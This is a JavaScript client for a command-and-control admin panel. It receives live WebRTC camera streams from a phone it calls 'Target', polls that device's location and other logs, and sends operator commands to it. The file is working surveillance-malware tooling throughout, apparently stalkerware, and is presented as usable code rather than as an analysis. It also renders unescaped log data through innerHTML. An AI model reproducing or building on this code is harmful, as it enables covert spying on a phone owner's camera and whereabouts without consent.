const socket = io();

// DOM Elements
const statusEl = document.getElementById('connectionStatus');
const clockEl = document.getElementById('clock');
const logOutput = document.getElementById('log-output');
const cmdInput = document.getElementById('cmd-input');
const tabs = document.querySelectorAll('.tab');

let currentLogType = 'location';

// --- 1. SYSTEM CLOCK ---
setInterval(() => {
    const now = new Date();
    clockEl.textContent = now.toISOString().split('T')[1].split('.')[0];
}, 1000);

// --- 2. SOCKET CONNECTION ---
socket.on('connect', () => {
    statusEl.textContent = '[ONLINE]';
    statusEl.classList.remove('offline');
    statusEl.classList.add('online');
    logSystem('Connected to C2 Server.');
    
    // Join the admin room to receive WebRTC signals
    socket.emit('identify', 'admin');
});

socket.on('disconnect', () => {
    statusEl.textContent = '[OFFLINE]';
    statusEl.classList.remove('online');
    statusEl.classList.add('offline');
    logSystem('Connection lost. Retrying...');
});

// --- 2.5 WEBRTC LOGIC (THE EYES) ---
const rtcConfig = {
    iceServers: [
        { urls: 'stun:stun.l.google.com:19302' } // Public STUN server
    ]
};
let peerConnection;
const remoteVideo = document.getElementById('remoteVideo');
const btnStart = document.getElementById('btn-start-stream');
const btnStop = document.getElementById('btn-stop-stream');

// Button Listeners
btnStart.addEventListener('click', () => sendCommand('START_STREAM'));
btnStop.addEventListener('click', () => sendCommand('STOP_STREAM'));

// A. Handle Incoming Offer (From Phone)
socket.on('webrtc_offer', async (offer) => {
    logSystem('Received WebRTC Offer from Target.');
    
    createPeerConnection();

    try {
        await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
        const answer = await peerConnection.createAnswer();
        await peerConnection.setLocalDescription(answer);

        // Send Answer back to Server (which sends to Phone via FCM/Socket)
        socket.emit('webrtc_answer', answer);
        logSystem('Sent WebRTC Answer.');
    } catch (err) {
        console.error('WebRTC Error:', err);
        logSystem(`WebRTC Error: ${err.message}`);
    }
});

// B. Handle ICE Candidates (From Phone)
socket.on('ice_candidate', async (candidate) => {
    if (peerConnection) {
        try {
            await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
            console.log('Added Remote ICE Candidate');
        } catch (err) {
            console.error('Error adding ICE candidate:', err);
        }
    }
});

function createPeerConnection() {
    if (peerConnection) peerConnection.close();

    peerConnection = new RTCPeerConnection(rtcConfig);

    // 1. Handle Remote Stream
    peerConnection.ontrack = (event) => {
        logSystem('Receiving Video Stream...');
        remoteVideo.srcObject = event.streams[0];
        document.querySelector('.overlay').style.display = 'none'; // Hide "WAITING" text
    };

    // 2. Handle ICE Candidates (Send to Phone)
    peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
            socket.emit('ice_candidate', event.candidate);
        }
    };

    // 3. Connection State Changes
    peerConnection.onconnectionstatechange = () => {
        logSystem(`WebRTC State: ${peerConnection.connectionState}`);
        if (peerConnection.connectionState === 'disconnected') {
            document.querySelector('.overlay').style.display = 'block';
        }
    };
}

// --- 3. LOG VIEWER ---
// Tab Switching
tabs.forEach(tab => {
    tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        currentLogType = tab.dataset.type;
        fetchLogs();
    });
});

// Fetch Logs
async function fetchLogs() {
    if (currentLogType === 'system') return; // System logs are local for now

    try {
        const res = await fetch(`/admin-api/logs/${currentLogType}`);
        const text = await res.text();
        
        // Parse NDJSON (Newline Delimited JSON)
        const lines = text.split('\n').filter(line => line.trim() !== '');
        const entries = lines.map(line => {
            try { return JSON.parse(line); } catch (e) { return null; }
        }).filter(e => e !== null);

        renderLogs(entries);
    } catch (err) {
        console.error('Failed to fetch logs:', err);
    }
}

function renderLogs(entries) {
    logOutput.innerHTML = ''; // Clear current
    
    // Show newest first
    entries.reverse().forEach(entry => {
        const div = document.createElement('div');
        div.className = 'log-entry';
        
        const time = entry.timestamp ? entry.timestamp.split('T')[1].split('.')[0] : 'UNKNOWN';
        const dataStr = JSON.stringify(entry, null, 0).replace(/"/g, ''); // Strip quotes for cleaner look
        
        div.innerHTML = `<span class="timestamp">[${time}]</span> ${dataStr}`;
        logOutput.appendChild(div);
    });
}

// Auto-refresh logs every 5 seconds
setInterval(fetchLogs, 5000);
fetchLogs(); // Initial load

// --- 4. COMMAND LINE ---
async function sendCommand(cmd, payload = {}) {
    logSystem(`Sending command: ${cmd}...`);
    
    try {
        const res = await fetch('/admin-api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: cmd, payload })
        });
        const data = await res.json();
        logSystem(`Command sent: ${data.status}`);
    } catch (err) {
        logSystem(`Error sending command: ${err.message}`);
    }
}

cmdInput.addEventListener('keypress', async (e) => {
    if (e.key === 'Enter') {
        const cmd = cmdInput.value.trim();
        if (!cmd) return;

        sendCommand(cmd);
        cmdInput.value = '';
    }
});

// --- HELPER ---
function logSystem(msg) {
    const div = document.createElement('div');
    div.className = 'log-entry';
    div.style.color = '#aaa';
    div.innerHTML = `<span class="timestamp">[SYSTEM]</span> ${msg}`;
    logOutput.prepend(div);
}
